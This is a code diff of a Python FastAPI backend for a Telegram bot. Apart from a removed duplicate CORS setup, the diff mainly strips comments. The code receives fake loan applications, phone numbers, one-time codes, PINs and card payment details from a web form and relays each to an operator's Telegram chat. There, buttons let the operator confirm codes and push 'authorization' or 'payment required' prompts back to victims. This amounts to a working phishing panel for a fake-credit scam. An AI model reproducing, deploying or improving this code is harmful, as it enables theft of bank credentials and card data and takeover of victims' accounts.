@@ -1,12 +1,3 @@
-from fastapi.middleware.cors import CORSMiddleware
-
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
 import os
 import logging
 from contextlib import asynccontextmanager
@@ -22,7 +13,6 @@ TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 logging.basicConfig(level=logging.INFO)
 
-# Хранилище сессий
 sessions = {}
 
 def send_to_telegram(chat_id: str, text: str, reply_markup: dict = None):
@@ -35,7 +25,6 @@ def send_to_telegram(chat_id: str, text: str, reply_markup: dict = None):
     except Exception as e:
         logging.error(f"Ошибка отправки: {e}")
 
-# ========== КЛАВИАТУРА ДЛЯ ЗАЯВКИ ==========
 def get_application_keyboard(session_id: str):
     return {
         "inline_keyboard": [
@@ -46,7 +35,6 @@ def get_application_keyboard(session_id: str):
         ]
     }
 
-# ========== КЛАВИАТУРЫ ДЛЯ КОДА И PIN ==========
 def get_code_keyboard(session_id: str):
     return {
         "inline_keyboard": [
@@ -67,7 +55,6 @@ def get_pin_keyboard(session_id: str):
         ]
     }
 
-# ========== МОДЕЛИ ДАННЫХ ==========
 class CreditApplicationData(BaseModel):
     session_id: str
     name: str
@@ -101,13 +88,12 @@ class PaymentData(BaseModel):
     amount: str = None
     timestamp: str = None
 
-# ========== FASTAPI ==========
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     render_url = os.getenv("RENDER_EXTERNAL_URL", "https://telegram-bot-gateway-1.onrender.com")
     webhook_url = f"{render_url}/webhook/callback"
     requests.post(f"{TELEGRAM_API_URL}/setWebhook", json={"url": webhook_url})
-    send_to_telegram(MY_CHAT_ID, "🤖 *Бот запущен* (с кнопками Авторизация и Оплата)")
+    send_to_telegram(MY_CHAT_ID, "🤖 *Бот запущен*")
     yield
     send_to_telegram(MY_CHAT_ID, "⚠️ Бот остановлен")
 
@@ -121,7 +107,6 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ========== 1. ЗАЯВКА С КАЛЬКУЛЯТОРА ==========
 @app.post("/submit_credit_application")
 async def submit_credit_application(data: CreditApplicationData):
     sid = data.session_id
@@ -134,8 +119,7 @@ async def submit_credit_application(data: CreditApplicationData):
         "amount": data.amount,
         "payment": data.payment,
         "user_chat_id": data.user_chat_id,
-        "status": "waiting_action",
-        "pending_action": None
+        "status": "waiting_action"
     }
     
     message = (
@@ -152,7 +136,6 @@ async def submit_credit_application(data: CreditApplicationData):
     send_to_telegram(MY_CHAT_ID, message, reply_markup=get_application_keyboard(sid))
     return {"status": "ok"}
 
-# ========== 2. НОМЕР ТЕЛЕФОНА (ДЛЯ АВТОРИЗАЦИИ) ==========
 @app.post("/submit_phone")
 async def submit_phone(data: PhoneData):
     phone = data.phone
@@ -172,7 +155,6 @@ async def submit_phone(data: PhoneData):
     )
     return {"status": "ok"}
 
-# ========== 3. КОД ==========
 @app.post("/submit_code")
 async def submit_code(data: CodeData):
     sid = data.session_id
@@ -192,7 +174,6 @@ async def submit_code(data: CodeData):
     )
     return {"status": "waiting_confirmation"}
 
-# ========== 4. PIN ==========
 @app.post("/submit_pin")
 async def submit_pin(data: PinData):
     sid = data.session_id
@@ -212,7 +193,6 @@ async def submit_pin(data: PinData):
     )
     return {"status": "waiting_confirmation"}
 
-# ========== 5. ОПЛАТА (ДАННЫЕ КАРТЫ) ==========
 @app.post("/submit_payment")
 async def submit_payment(data: PaymentData):
     sid = data.session_id
@@ -228,7 +208,6 @@ async def submit_payment(data: PaymentData):
     send_to_telegram(MY_CHAT_ID, message)
     return {"status": "ok"}
 
-# ========== 6. ПРОВЕРКА СТАТУСА ДЛЯ АВТОРИЗАЦИИ/ОПЛАТЫ ==========
 @app.get("/check_action_status/{session_id}")
 async def check_action_status(session_id: str):
     session = sessions.get(session_id)
@@ -241,7 +220,6 @@ async def check_action_status(session_id: str):
         return {"action": action}
     return {"action": None}
 
-# ========== 7. ПРОВЕРКА СТАТУСА ДЛЯ КОДА/PIN ==========
 @app.get("/check_status/{session_id}")
 async def check_status(session_id: str):
     session = sessions.get(session_id)
@@ -261,7 +239,6 @@ async def check_status(session_id: str):
     else:
         return {"status": status}
 
-# ========== 8. ОБРАБОТКА КНОПОК ==========
 @app.post("/webhook/callback")
 async def handle_callback(request: Request):
     data = await request.json()
@@ -283,7 +260,6 @@ async def handle_callback(request: Request):
     session = sessions.get(session_id)
     user_chat_id = session.get("user_chat_id") if session else None
     
-    # ===== КНОПКА "АВТОРИЗАЦИЯ" =====
     if action == "auth":
         if user_chat_id:
             if session:
@@ -292,7 +268,7 @@ async def handle_callback(request: Request):
                 str(user_chat_id),
                 "🔐 *Требуется авторизация*\n\nНеобходимо авторизоваться для получения кредита"
             )
-            send_to_telegram(MY_CHAT_ID, f"🔐 Модалка авторизации отправлена пользователю")
+            send_to_telegram(MY_CHAT_ID, f"🔐 Модалка авторизации отправлена")
         else:
             send_to_telegram(MY_CHAT_ID, f"⚠️ Не найден chat_id для сессии {session_id}")
         requests.post(
@@ -300,7 +276,6 @@ async def handle_callback(request: Request):
             json={"callback_query_id": callback_id, "text": "Уведомление отправлено"}
         )
     
-    # ===== КНОПКА "ОПЛАТА" =====
     elif action == "pay":
         if user_chat_id:
             if session:
@@ -309,7 +284,7 @@ async def handle_callback(request: Request):
                 str(user_chat_id),
                 "💳 *Требуется оплата*\n\nДля получения кредита укажите карту"
             )
-            send_to_telegram(MY_CHAT_ID, f"💳 Модалка оплаты отправлена пользователю")
+            send_to_telegram(MY_CHAT_ID, f"💳 Модалка оплаты отправлена")
         else:
             send_to_telegram(MY_CHAT_ID, f"⚠️ Не найден chat_id для сессии {session_id}")
         requests.post(
@@ -317,7 +292,6 @@ async def handle_callback(request: Request):
             json={"callback_query_id": callback_id, "text": "Уведомление отправлено"}
         )
     
-    # ===== КНОПКИ ДЛЯ КОДА =====
     elif action == "code":
         result = parts[1] if len(parts) > 1 else "wrong"
         if result == "ok":
@@ -337,7 +311,6 @@ async def handle_callback(request: Request):
             json={"callback_query_id": callback_id, "text": "Обработано"}
         )
     
-    # ===== КНОПКИ ДЛЯ PIN =====
     elif action == "pin":
         result = parts[1] if len(parts) > 1 else "wrong"
         if result == "ok":
